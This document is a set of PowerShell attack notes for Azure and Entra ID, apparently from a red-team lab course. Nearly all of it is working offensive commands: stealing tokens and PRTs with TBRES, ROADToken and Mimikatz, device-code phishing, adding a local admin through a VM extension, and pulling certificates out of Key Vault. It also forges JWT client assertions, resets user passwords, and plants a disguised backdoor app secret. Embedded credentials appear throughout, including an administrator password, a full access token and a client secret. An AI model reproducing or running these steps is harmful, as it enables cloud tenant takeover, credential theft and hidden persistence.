        Copy-Item -ToSession $ec2instance -Path C:\AzAD\Tools\TBRES\ -Destination C:\Users\Public\student61 -Recurse -Verbose
        Copy-Item -ToSession $ec2instance -Path C:\AzAD\Tools\Invoke-RunasCs.ps1 -Destination C:\Users\Public\student61 -Verbose
        # Enter PS session and run it , we need admin creds, we can get it from user data if there
        . C:\Users\Public\student61\Invoke-RunasCs.ps1
        Invoke-RunasCs -Username administrator -Password '%dlTKmropc!1l3I(o1j5834H$0VZ))2p' -Command C:\Users\Public\student61\TBRES.exe
        # in System32, the decrypted token, search largest latest file 
        ls C:\Windows\System32\*.decrypted |sort -Property LastWriteTime -Descending
        # Cat each file and check it's JWT, if it's aud points to graph.microsoft.com to get Graph AT. 
    # After getting AT, list one drive accessible files 
    $GraphAccessToken ="..."
    $Params = @{
        "URI"     = "https://graph.microsoft.com/beta/me/drive/root/children"
        "Method"  = "GET"
        "Headers" = @{
            "Authorization" = "Bearer $GraphAccessToken"
            "Content-Type"  = "application/json"
            }
        }
    $Result = Invoke-RestMethod @Params -UseBasicParsing
    $Result.value
    # if you found certain name interesting, get it's download url 
    (($Result.value) | where{$_.Name -eq 'accessingplantinfo.ps1'}).'@microsoft.graph.downloadUrl'
    # open browser and download it
    # List All resources permission, e.g. VM
        $FormatEnumerationLimit =-1 # No truncation (No ....)
        $Resources = Get-AzResource
        $Token = (Get-AzAccessToken).Token
        foreach($Resource in $Resources)
        {
            $ID = $Resource.Id
            $URI = "https://management.azure.com/$ID/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
            $RequestParams = @{
                Method = 'GET'
                Uri = $URI
                Headers = @{
                    'Authorization' = "Bearer $Token"
                    }
                    ContentType = "application/json"
                   
            }
            $Result = Invoke-RestMethod @RequestParams
            $ResourceName = $Resource.Name
            Write-Output "ResourceName - $ResourceName"
            Write-Output "Permissions -" $Result.value | fl *
        }
    # Access user inbox emails :
    Connect-MgGraph -AccessToken ($AccessToken | ConvertTo-SecureString -AsPlainText -Force)
    Get-MgUserMessage -UserId CaseyRSawyer@oilcorporation.onmicrosoft.com |fl
    # List CERTIAN resource permission, e.g. VM
    $Token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImtXYmthYTZxczh3c1RuQndpaU5ZT2hIYm5BdyIsImtpZCI6ImtXYmthYTZxczh3c1RuQndpaU5ZT2hIYm5BdyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8yZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYvIiwiaWF0IjoxNzA4NTk3NzcwLCJuYmYiOjE3MDg1OTc3NzAsImV4cCI6MTcwODYwMjgxNCwiYWNyIjoiMSIsImFpbyI6IkFUUUF5LzhXQUFBQWM5bjY5YktrTmJWcFJQU0JBbzc4ZzhmeWtMY09UQXNGcFBBWE0rRlNnNU9OQjRxSUh2YWtOcVo0THo4MXl1QmMiLCJhbXIiOlsicHdkIl0sImFwcGlkIjoiMTk1MGEyNTgtMjI3Yi00ZTMxLWE5Y2YtNzE3NDk1OTQ1ZmMyIiwiYXBwaWRhY3IiOiIwIiwiZ3JvdXBzIjpbIjE1NGE5MzI2LWZmZjEtNDYzZC04ZTJiLWRkMjE3YjZmNjA2NCJdLCJpZHR5cCI6InVzZXIiLCJpcGFkZHIiOiI1MS4yMTAuMS4yMzkiLCJuYW1lIjoiU2FtIEMuIEdyYXkiLCJvaWQiOiJlNDQzNTgxYi05NTQ3LTQ2MWYtYjU2Zi1hZGYyYTIwN2QwMmMiLCJwdWlkIjoiMTAwMzIwMDEyMTlGRjQ1QSIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0a1pJZjNrQXV0ZFB1a1Bhd2ZqMk1CUEVBTEUuIiwic2NwIjoidXNlcl9pbXBlcnNvbmF0aW9uIiwic3ViIjoiU1plOGJoTy1OeHFLWi01T1dkMXUzdVlxS0FILUIycXNYR2FNQTE2RVk2dyIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInVuaXF1ZV9uYW1lIjoic2FtY2dyYXlAZGVmY29ycGhxLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6InNhbWNncmF5QGRlZmNvcnBocS5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJoTW1UYjRKN25rdUtMWm9wMUZ4YUFBIiwidmVyIjoiMS4wIiwid2lkcyI6WyJiNzlmYmY0ZC0zZWY5LTQ2ODktODE0My03NmIxOTRlODU1MDkiXSwieG1zX2NhZSI6IjEiLCJ4bXNfY2MiOlsiQ1AxIl0sInhtc19maWx0ZXJfaW5kZXgiOlsiMTEyIl0sInhtc19yZCI6IjAuNDJMbFlCUmlMQUFBIiwieG1zX3NzbSI6IjEiLCJ4bXNfdGNkdCI6MTYxNTM3NTYyOX0.Rkc0y9WEEjvbFxcbpV-QKcTASAOpUH1qivl850z1ts-5vkEOmp2V1jVo7Y6hZEq__d8U1MvXvvs_vqp-h1WXIZHYVu9JxAgimEhyPEuxt6kiXa0RqctEjW3SU1MpWKfm67KiYT2wbAF9csLmaY0lXSvlgVVSLvNnHVH7XsSRM3rTTRmwnC5R3ik_bGAOYCDrXWYmGiZBU2K6ya9-6STuAjiIyyB2UA27qcXecnc1AGXoeL3CfvuMf0GO_4OMXVGdbw3e6m8w1OmYuZq1p-T3nipZHXFNHDLfqigaAonZaKv11AkDkzdFv-X8D_xuzMpj0vE0D61PMYjjP9aoOBALVA"
    $URI = 'https://management.azure.com/{ResourceID}/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
    $RequestParams = @{
        Method = 'GET'
        Uri = $URI
        Headers = @{
        'Authorization' = "Bearer $Token"
        }
    }
    (Invoke-RestMethod @RequestParams).value 
    # Get VM extension details 
    Get-AzVMExtension -ResourceGroupName "Research" -VMName "infradminsrv"
    # If you have write permission over vm extension, we can create a local user as admin
    Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany WestCentral" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users student17 Stud17Password@123 /add /Y; net localgroup administrators student17 /add"}'
    
    # Extracting PRT
    # Getting Nonce (From any machine)
        $TenantId = "2d50cb29-5f7b-48a4-87ce-fe75a941adb6"
        $URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"
        $Params = @{
            "URI" = $URL
            "Method" = "POST"
        }
        $Body = @{
        "grant_type" = "srv_challenge"
        }
        $Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
        $Result.Nonce
    # Utilize the nonce 
    C:\Users\student17\Documents\ROADToken.exe $Result.Nonce
    # Or in another session 
    Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\ROADToken.exe -Destination C:\Users\student17\Documents -Verbose
    Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\PsExec64.exe -Destination C:\Users\student17\Documents -Verbose
    Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\SessionExecCommand.exe -Destination C:\Users\student17\Documents -Verbose
    # ignore any error execept argument is too long    
    Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\student17\Documents\PsExec64.exe -accepteula -s "cmd.exe" " /c C:\Users\student17\Documents\SessionExecCommand.exe MichaelMBarron C:\Users\student17\Documents\ROADToken.exe AwABAAEAAAACAOz_BQD0_23rEiaJgjV8RK-Kg19JFMskwUpn2zuPSHBBvCOjiwqw3UP_ysqXPnuELoG8MvwBBR_zV3f60eQSypbGQJWajXcgAA > C:\Temp\PRT17.txt"}
    Invoke-Command -Session $infradminsrv -ScriptBlock{cat C:\Temp\PRT17.txt}
    Invoke-Command -Session $infradminsrv -ScriptBlock{. C:\Users\student17\Documents\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command ' "privilege::debug" "sekurlsa::cloudap" "exit"'}    
    # Extract PRT
    Get-AADIntUserPRTToken
    


    # SP creds utilization  
    # Secret
    $passwd = ConvertTo-SecureString "ylz8Q~kasdfasdfasfdasdfasZZZZdfas" -AsPlainText -Force
    # App ID
    $creds = New-Object System.Management.Automation.PSCredential ("ebf26192-9eb1-47a8-8554-739ef769b00a", $passwd)
    Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 4e7a1151-36d0-457e-b489-729cf0fb315a
    # Entra id authentication 
    Connect-MgGraph -ClientSecretCredential $creds -TenantId d6bd5a42-7c65-421c-ad23-a25a5d5fa57f
    # Dynamic group abuse: 
    Set-AzureADUser -ObjectId  5dec6744-f973-4fb7-ab07-2542d41dfb75  -OtherMails vendor17@defcorpextcontractors.onmicrosoft.com  -Verbose
    
    # Enumerate all the applications that has application proxy configured
    Get-AzureADApplication | % {try{ Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
    # Check users who has access to app with app proxy:
        Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "Finance Management System"}
        # Take object id of the app and use it in this:
        . C:\AzAD\Tools\Get-ApplicationProxyAssignedUsersAndGroups.ps1
        Get-ApplicationProxyAssignedUsersAndGroups -ObjectId ec350d24-e4e4-4033-ad3f-bf60395f0362

####### CARTE ##########
    # Device Code Phishing
        Import-Module C:\AzAD\Tools\TokenTactics-main\TokenTactics.psd1
        Get-AzureToken -Client MSGraph
            # Afte get the device code and authenticate, we can get it's access token using :
            $response.access_token
            # If access token expired, you get access token from below : 
            Invoke-RefreshGraphTokens -refreshToken $response.refresh_token -tenantid d6bd5a42-7c65-421c-ad23-a25a5d5fa57f
            # Tenant id , you can get it from the expired access token in jwt: 


    # FOCI MS graph access token   
    $GraphAT = (Invoke-RefreshToMSGraphToken  -domain oilcorporation.onmicrosoft.com -refreshToken $tokens.refresh_token).access_token

    # Get permission for certain keyvault : 
    $KeyVault = Get-AzKeyVault
    $SubscriptionID = (Get-AzSubscription).Id
    $ResourceGroupName = $KeyVault.ResourceGroupName
    $KeyVaultName = $KeyVault.VaultName
    $URI = "https://management.azure.com/subscriptions/$SubscriptionID/resourceGroups/$ResourceGroupName/providers/Microsoft.KeyVault/vaults/$KeyVaultName/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
    $RequestParams = @{
       Method = 'GET'
       Uri = $URI
       Headers = @{
        'Authorization' = "Bearer $Access_Token"
        }
    }
    $Permissions = (Invoke-RestMethod @RequestParams).value
    $Permissions | fl *
    
    
    # Getting Apps that has secrets or certs, save them as XML
        $GraphAccessToken = $AccessToken
        $URI = "https://graph.microsoft.com/v1.0/Applications"
        $RequestParams = @{
            Method = 'GET'
            Uri = $URI
            Headers = @{
            'Authorization' = "Bearer $GraphAccessToken"
             }
        }
        $Applications = (Invoke-RestMethod @RequestParams).value

        $ApplicationsDetails = [PSCustomObject]@{
        Applications = @()}
        foreach($Application in $Applications)
        {
            $applicationObject = [PSCustomObject]@{
            DisplayName = $Application.displayName
            AppId = $Application.appId
            CreatedDateTime = $Application.createdDateTime
            ID = $Application.id
            keyCredentials = $Application.keyCredentials
            passwordCredentials = $Application.passwordCredentials
        }
        $ApplicationsDetails.Applications += $applicationObject
        }
        $ApplicationsDetails.Applications
        # Save the content 
        $ApplicationsDetails.Applications | Export-Clixml -Path C:\AzAD\Tools\OilCorpApplications.xml

    # if you got a cert from anywhere (e.g. keyvault), you can check if any app/SP utilizing it
        # Get Cert from keyvault and store it to disk 
        $secret = Get-AzKeyVaultSecret -VaultName GISAppvault -Name GISAppCert -AsPlainText
        $secretByte = [Convert]::FromBase64String($secret)
        [System.IO.File]::WriteAllBytes("C:\AzAD\Tools\StorageCert.pfx", $secretByte)
        # Get Cert content and compare it with cert thump from tenant app we enumerated
        $clientCertificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList 'C:\AzAD\Tools\StorageCert.pfx'
        Import-Clixml C:\AzAD\Tools\OilCorpApplications.xml | Where {$_.keyCredentials.customKeyIdentifier -eq $clientCertificate.Thumbprint}

    # ِExtract Key vault AT
        $scope = 'https://vault.azure.net/.default'
        $refresh_token = $tokens.refresh_token
        $GrantType = 'refresh_token'
        $body=@{
            "client_id" = $ClientID
            "scope" = $Scope
            "refresh_token" = $refresh_token
            "grant_type" = $GrantType
        }
        $KeyVaultAccessToken = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
        $KeyVaultAccessToken

    # Connect again : 
        Connect-AzAccount -AccessToken $accesstoken -KeyVaultAccessToken $keyvaultaccesstoken.access_token -AccountId ThomasLWright@oilcorporation.onmicrosoft.com

    # Get Key vault cert 
    Get-AzKeyVaultCertificate -VaultName GISAppvault
    $secret = Get-AzKeyVaultSecret -VaultName GISAppvault -Name GISAppCert -AsPlainText
    $secretByte = [Convert]::FromBase64String($secret)
    [System.IO.File]::WriteAllBytes("C:\AzAD\Tools\GISAppcert.pfx", $secretByte)
    
    # Auth with cert and Get AT: 
        . .\New-AccessToken.ps1
        $secret = Get-Content .\CertificateBase64.txt
        $secretByte = [Convert]::FromBase64String($secret)
        [System.IO.File]::WriteAllBytes("C:\AzAD\Tools\StorageCert.pfx", $secretByte)
        $clientCertificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList 'C:\AzAD\Tools\StorageCert.pfx'
        $StorageToken = New-AccessToken -clientCertificate $clientCertificate -tenantID  2e0d024c-5e44-47f7-b4b8-42126b542e36 -appID 578e381a-8f03-4cae-8b3e-559d02023ee1 -scope 'https://management.azure.com/.default'
        $GraphToken = New-AccessToken -clientCertificate $clientCertificate -tenantID  2e0d024c-5e44-47f7-b4b8-42126b542e36 -appID 578e381a-8f03-4cae-8b3e-559d02023ee1 -scope 'https://graph.microsoft.com/.default'
        $AadToken = New-AccessToken -clientCertificate $clientCertificate -tenantID  2e0d024c-5e44-47f7-b4b8-42126b542e36 -appID 578e381a-8f03-4cae-8b3e-559d02023ee1 -scope 'https://graph.windows.net/.default'
        Connect-AzureAD -AadAccessToken $AadToken -AccountId 578e381a-8f03-4cae-8b3e-559d02023ee1 -TenantId 2e0d024c-5e44-47f7-b4b8-42126b542e36
        Connect-AzAccount -AccessToken $StorageToken -AccountId 578e381a-8f03-4cae-8b3e-559d02023ee1
        [X509Certificate]$clientCertificate2 = Get-PfxCertificate -FilePath C:\AzAD\Tools\StorageCert.pfx
        Connect-MgGraph -Certificate $clientCertificate2 -ClientId 578e381a-8f03-4cae-8b3e-559d02023ee1 -TenantId 2e0d024c-5e44-47f7-b4b8-42126b542e36

    # Get cert meta data and sign it using JWT
        # 1.Get Cert Meta data from keyvault 
            # Get Key vault all certs metadata 7.4 version , asegfdnurqpj3343460== key vault name
                $URI = "https://asegfdnurqpj3343460.vault.azure.net/certificates?api-version=7.4"
                $RequestParams = @{
                    Method = 'GET'
                    Uri = $URI
                    Headers = @{
                    'Authorization' = "Bearer $KVAT"
                    }
                    ContentType = "application/json"
                    }
                $KVInfo = (Invoke-RestMethod @RequestParams).value
                $KVInfo | fl *
                
            # $GISAppMgmtToken = New-AccessToken -clientCertificate $clientCertificate -tenantID d6bd5a42-7c65-421c-ad23-a25a5d5fa57f -appID 2b7c28bd-def1-415a-b407-41627de6e8f1 -scope 'https://management.azure.com/.default'
            # $GISAppKeyVaultToken = New-AccessToken -clientCertificate $clientCertificate -tenantID d6bd5a42-7c65-421c-ad23-a25a5d5fa57f -appID 2b7c28bd-def1-415a-b407-41627de6e8f1 -scope 'https://vault.azure.net/.default'
            # Get Vault cert meta data (more details), then using 7.3 API Version 
                function Get-AKVCertificate($kvURI, $GISAppKeyVaultToken, $keyName) {
                        # Get all certs
                        $uri = "$($kvURI)/certificates?api-version=7.3"
                        $httpResponse = Invoke-WebRequest -Uri $uri -Headers @{ 'Authorization' =
                        "Bearer $($GISAppKeyVaultToken)" }
                        $certs = $httpResponse.Content | ConvertFrom-Json
                        #Write-Output $certs
                        # Filter our own cert
                        $certUri = $certs.Value | where {$_.id -like "*$($keyName)*"}
                        Write-Output $certUri
                        # Get cerrt details 
                        # https://keyVaultName.vault.azure.net/certificates/KertName
                        $httpResponse = Invoke-WebRequest -Uri "$($certUri.id)?api-version=7.3" -Headers @{ 'Authorization' = "Bearer $($KVAT)" }
                        return $httpResponse.Content | ConvertFrom-Json
                    }
                $AKVCertificate = Get-AKVCertificate -kvURI 'https://asegfdnurqpj3343460.vault.azure.net' -GISAppKeyVaultToken $KVAT -keyName 'AS-lsguyqwnaj3343458'
                $AKVCertificate | fl *
                    
        # 2.Create a JWT and sing it utilizing $AKVCertificate cert meta data
            # Taken from https://www.huntandhackett.com/blog/researching-access-tokensfor-fun-and-knowledge
            # Require : $GISAppKeyVaultToken, $AKVCertificate.x5t[0] , $AKVCertificate.kid,$tenantID
            $DataAnalyticsAppID = 'f23a808b-6a01-4fb2-bfd9-bdb3e8390421'
            $tenantID = 'd6bd5a42-7c65-421c-ad23-a25a5d5fa57f'
            $audience = "https://login.microsoftonline.com/$tenantID/oauth2/token"
            # JWT request should be valid for max 2 minutes.
            $StartDate = (Get-Date "1970-01-01T00:00:00Z" ).ToUniversalTime()
            $JWTExpirationTimeSpan = (New-TimeSpan -Start $StartDate -End (Get-Date).ToUniversalTime().AddMinutes(2)).TotalSeconds
            $JWTExpiration = [math]::Round($JWTExpirationTimeSpan,0)

            # Create a NotBefore timestamp.
            $NotBeforeExpirationTimeSpan = (New-TimeSpan -Start $StartDate -End ((Get-Date).ToUniversalTime())).TotalSeconds
            $NotBefore = [math]::Round($NotBeforeExpirationTimeSpan,0)
            # Create JWT header
            $jwtHeader = @{
            'alg' = "RS256" # Use RSA encryption and SHA256 as hashing algorithm
            'typ' = "JWT" # We want a JWT
            'x5t' = $AKVCertificate.x5t[0] # The pubkey hash we received from Azure Key Vault
            }
            # Create the payload
            $jwtPayLoad = @{
            'aud' = $audience # Points to oauth token request endpoint for your tenant
            'exp' = $JWTExpiration # Expiration of JWT request
            'iss' = $DataAnalyticsAppID # The AppID for which we request a token for
            'jti' = [guid]::NewGuid() # Random GUID
            'nbf' = $NotBefore # This should not be used before this timestamp
            'sub' = $DataAnalyticsAppID # Subject
                }
            # Convert header and payload to json and to base64
            $jwtHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes(($jwtHeader | ConvertTo-Json))
            $jwtPayloadBytes = [System.Text.Encoding]::UTF8.GetBytes(($jwtPayLoad | ConvertTo-Json))
            $b64JwtHeader = [System.Convert]::ToBase64String($jwtHeaderBytes)
            $b64JwtPayload = [System.Convert]::ToBase64String($jwtPayloadBytes)
            # Concat header and payload to create an unsigned JWT and compute a Sha256 hash
            $unsignedJwt = $b64JwtHeader + "." + $b64JwtPayload
            $unsignedJwtBytes = [System.Text.Encoding]::UTF8.GetBytes($unsignedJwt)
            $hasher =
            [System.Security.Cryptography.HashAlgorithm]::Create('sha256')
            $jwtSha256Hash = $hasher.ComputeHash($unsignedJwtBytes)
            $jwtSha256HashB64 = [Convert]::ToBase64String($jwtSha256Hash) -replace '\+','-' -replace '/','_' -replace '='
            # Sign the sha256 of the unsigned JWT using the certificate in Azure Key Vault
            $uri = "$($AKVCertificate.kid)/sign?api-version=7.3"
            $headers = @{
            'Authorization' = "Bearer $GISAppKeyVaultToken"
            'Content-Type' = 'application/json'
            }
            $response = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body (([ordered] @{
            'alg' = 'RS256'
            'value' = $jwtSha256HashB64
            }) | ConvertTo-Json)
            $signature = $response.value
            # Concat the signature to the unsigned JWT
            $signedJWT = $unsignedJwt + "." + $signature

            # Request ARM Token using the jwt token
            $uri = "https://login.microsoftonline.com/$tenantID/oauth2/v2.0/token"
            $headers = @{'Content-Type' = 'application/x-www-form-urlencoded'}
            $response = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body ([ordered]@{
                'client_id' = $DataAnalyticsAppID
                'client_assertion' = $signedJWT
                'client_assertion_type' = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer' 
                'scope' = 'https://management.azure.com/.default'
                'grant_type' = 'client_credentials'
            })
            $DataAnalyticsAppToken = "$($response.access_token)"
            $DataAnalyticsAppToken
            # Connect with the new signed jwt token
            Connect-AzAccount -AccessToken $DataAnalyticsAppToken -AccountId f23a808b-6a01-4fb2-bfd9-bdb3e8390421
            # Get Storage azure Token using Signed JWT
            $TenantId = "d6bd5a42-7c65-421c-ad23-a25a5d5fa57f"
            $uri = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"
            $headers = @{'Content-Type' = 'application/x-www-form-urlencoded'}
            $response = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body ([ordered]@{
            'client_id' = $DataAnalyticsAppID
            'client_assertion' = $signedJWT
            'client_assertion_type' = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
            'scope' = 'https://storage.azure.com/.default'
            'grant_type' = 'client_credentials'
            })
            $DataAnalyticsAppStorageToken = "$($response.access_token)"

            # Get the list of files present in the storage account.
            $URL = "https://oildatastore.blob.core.windows.net/?comp=list"
            $Params = @{
            "URI" = $URL
            "Method" = "GET"
            "Headers" = @{
            "Content-Type" = "application/json"
            "Authorization" = "Bearer $DataAnalyticsAppStorageToken"
            "x-ms-version" = "2017-11-09"
            "accept-encoding" = "gzip, deflate"
            }
            }
            $Result = Invoke-RestMethod @Params -UseBasicParsing
            $Result 
        ###########

        # Get permissions for stroage account
            $Access_Token = (Get-AzAccessToken).Token
            $stroageAccount = Get-AzStorageAccount
            $SubscriptionID = (Get-AzSubscription).Id
            $ResourceGroupName = $stroageAccount.ResourceGroupName
            $StorageAccountName = $stroageAccount.StorageAccountName
            $URI = "https://management.azure.com/subscriptions/$SubscriptionID/resourceGroups/$ResourceGroupName/providers/Microsoft.Storage/storageAccounts/$StorageAccountName/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
            $RequestParams = @{
                Method = 'GET'
                Uri = $URI
                Headers = @{
                'Authorization' = "Bearer $Access_Token"
                }
            }
            $Permissions = (Invoke-RestMethod @RequestParams).value
            $Permissions | fl *
        
        # Get files of 'certificates' container from 'oildatastore' blob
        $URL ="https://oildatastore.blob.core.windows.net/certificates?restype=container&comp=list"
        $Params = @{
        "URI" = $URL
        "Method" = "GET"
        "Headers" = @{
            "Content-Type" = "application/json"
            "Authorization" = "Bearer $DataAnalyticsAppStorageToken"
            "x-ms-version" = "2017-11-09"
            "accept-encoding" = "gzip, deflate"
            }
           }
        $XML=Invoke-RestMethod @Params -UseBasicParsing
        #Remove BOM characters and list Blob names
        $XML.TrimStart([char]0xEF,[char]0xBB,[char]0xBF) | Select-Xml -XPath "//Name" | foreach {$_.node.InnerXML}

        
        # Get certain file content (CertAttachment61.txt file) from 'certificates' container from 'oildatastore' blob
            $URL ="https://oildatastore.blob.core.windows.net/certificates/CertAttachment61.txt"
            $Params = @{
                "URI" = $URL
                "Method" = "GET"
                "Headers" = @{
                    "Content-Type" = "application/json"
                    "Authorization" = "Bearer $DataAnalyticsAppStorageToken"
                    "x-ms-version" = "2017-11-09"
                    "accept-encoding" = "gzip, deflate"
                }
                }
            $cert = Invoke-RestMethod @Params -UseBasicParsing
            $cert
            # Write the cert to disk 
            $secretByte = [Convert]::FromBase64String($Cert)
            [System.IO.File]::WriteAllBytes("C:\AzAD\Tools\spcert.pfx",$secretByte)
            # Compare the cert thumbprint with customKeyIdentifier from the KeyCredentials in each app , to check which app can use that cert
            $spCertificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList 'C:\AzAD\Tools\spcert.pfx'
            Import-Clixml C:\AzAD\Tools\OilCorpApplications.xml | Where {$_.keyCredentials.customKeyIdentifier -eq $spCertificate.Thumbprint}

        # Modify tags to add Department=>Geology as tag, becasue condition to read content that Department=>Geology  tag must be written
        $URL = "https://oildatastore.blob.core.windows.net/certificates/CertAttachment61.txt?comp=tags"
        $Params = @{
            "URI" = $URL
            "Method" = "PUT"
            "Headers" = @{
            "Content-Type" = "application/xml; charset=UTF-8"
            "Authorization" = "Bearer $DataAnalyticsAppStorageToken"
            "x-ms-version" = "2020-04-08"
            }
        }
        $Body = @"
        <?xml version="1.0" encoding="utf-8"?>
        <Tags>
            <TagSet>
                <Tag>
                    <Key>Department</Key>
                    <Value>Geology</Value>
                </Tag>
            </TagSet>
        </Tags>
"@
    Invoke-RestMethod @Params -UseBasicParsing -Body $Body

    # IF u got a cert, and it has empty subscription when u authenticate through az cli ps , u can use mg module to enumerate entra id role assigments
    # authenticate with cert 
    [X509Certificate]$GeologyAppCertificate = Get-PfxCertificate -FilePath C:\AzAD\Tools\spcert.pfx
    Connect-MgGraph -Certificate $GeologyAppCertificate -ClientId b1d10eb3-d631-499f-8197-f13de675904c -TenantId d6bd5a42-7c65-421c-ad23-a25a5d5fa57f
    # Get app id of SP we curretly authenticated to
    Get-MgServicePrincipal  -Filter "DisplayName eq 'GeologyApp'"
    # Filter entra id roles for our SP using it's id:
    Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq 'eef35297-f198-4dd9-9027-04dc69a05ca2'" | ForEach-Object {
        $roleDef = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $_.RoleDefinitionId
        [PSCustomObject]@{
        RoleDisplayName = $roleDef.DisplayName
        RoleId = $roleDef.Id
        DirectoryScopeId = $_.DirectoryScopeId
        }
       } | Select-Object RoleDisplayName, RoleId, DirectoryScopeId | fl
    # Get App roles
    Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId 578e381a-8f03-4cae-8b3e-559d02023ee1 | fl
    # Get certain app role definiation :
    (Get-MgServicePrincipal -Filter "appId eq '00000003-0000-0000-c000-000000000000'").AppRoles | ? {$_.id -eq '246dd0d5-5bd0-4def-940b-0421030a5b68' } | fl
    

    # Get members of certain administratie unit (e.g Helpdesk administrators->DirectoryScopeId )
    Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId b14fcc2e-7a5a-4935-b4a5-835fd8018efe | select Id, @{Name='userPrincipalName';Expression={$_.AdditionalProperties.userPrincipalName}} | fl
    # If we have the previous pririvlage, we can reset user's members
    $passwordProfile = @{
        forceChangePasswordNextSignIn = $false
        password = 'NewUserSSecret@Pass61'
    }
    Update-MgUser -UserId AS-5945632460@oilcorptarsands.onmicrosoft.com -PasswordProfile $passwordProfile

    # If you have applicatio adminstrator privilege, we can add creds to app, let's enumerate that: 
    Get-MgApplication -ApplicationId da53a80e-cb86-4158-96e1-7b19f7fec496 # -ApplicationId=DirectoryScopedId
    $passwordCred = @{
        displayName = 'Added by Azure Service Bus - DO NOT DELETE'
        endDateTime = (Get-Date).AddMonths(6)
    }
    Add-MgApplicationPassword -ApplicationId da53a80e-cb86-4158-96e1-7b19f7fec496 -PasswordCredential $passwordCred
    # if we have access to SP, we can enumerate what are the owned objects for this SP, -ServicePrincipalId from Get-MgServicePrincipal command
    Get-MgServicePrincipalOwnedObject -ServicePrincipalId 1e2dc461-ecae-4a2b-aa61-3aa8622c1344 | select Id, @{Name='displayName';Expression={$_.AdditionalProperties.displayName}},@{Name ='ObjectTyoe';Expression={$_.AdditionalProperties.'@odata.type'}} | fl

    # Add user to group 
        #DirectoryObjectId : User id we want to add
        New-MgGroupMember -GroupId 91f7bfb1-b326-4376-8953-5d6d9b44e443 -DirectoryObjectId  2b269505-f49b-42c1-ae65-d22dc1faabe4 -Verbose

    # Enumerate All CAPs: 
        [X509Certificate]$GeologyAppCertificate = Get-PfxCertificate -FilePath C:\AzAD\Tools\spcert.pfx
        Connect-MgGraph -Certificate $GeologyAppCertificate -ClientId b1d10eb3-d631-499f-8197-f13de675904c -TenantId d6bd5a42-7c65-421c-ad23-a25a5d5fa57f
        # we need policy.read.all privileg, to know if you have,check Scopes :
        Get-MgContext
        # Enum all CAPs (check DisplayName,BuiltInControls)
        Get-MgIdentityConditionalAccessPolicy | ConvertTo-Json | Out-File caps.json
        # Enum if CAP applied to certain group ID

        
        # Enumerate CAP using RAW API
        # Get Extract access Token from MgGraph Tool (Dirty way)
        $InMemoryTokenCacheGetTokenData = [Microsoft.Graph.PowerShell.Authentication.Core.TokenCache.InMemoryTokenCache].GetMethod("ReadTokenData",[System.Reflection.BindingFlags]::NonPublic+[System.Reflection.BindingFlags]::Instance)
        $TokenData = $InMemoryTokenCacheGetTokenData.Invoke([Microsoft.Graph.PowerShell.Authentication.GraphSession]::Instance.InMemoryTokenCache,$null)
        $TokenObjStr = [System.Text.Encoding]::UTF8.GetString($TokenData)
        $obj = $TokenObjStr -Split "`"secret`":`"" 
        $obj = $obj[1] -Split "`",`"credential_type"
        $token = $obj[0]

        Connect-MgGraph 
        Connect-MgGraph -Scopes "Policy.Read.All" -Certificate $clientCertificate2 -ClientId 578e381a-8f03-4cae-8b3e-559d02023ee1 -TenantId 2e0d024c-5e44-47f7-b4b8-42126b542e36
        $Token = $GraphToken    
        $URI = 'https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies'
        $RequestParams = @{
         Method = 'GET'
         Uri = $URI
         Headers = @{
         'Authorization' = "Bearer $Token"
         }
        }
        $CAPs = (Invoke-RestMethod @RequestParams).value  | % {$_ | ConvertTo-Json}  
    # Get access Token from MgGraph Tool (Dirty way)
        $InMemoryTokenCacheGetTokenData = [Microsoft.Graph.PowerShell.Authentication.Core.TokenCache.InMemoryTokenCache].GetMethod("ReadTokenData",[System.Reflection.BindingFlags]::NonPublic+[System.Reflection.BindingFlags]::Instance)
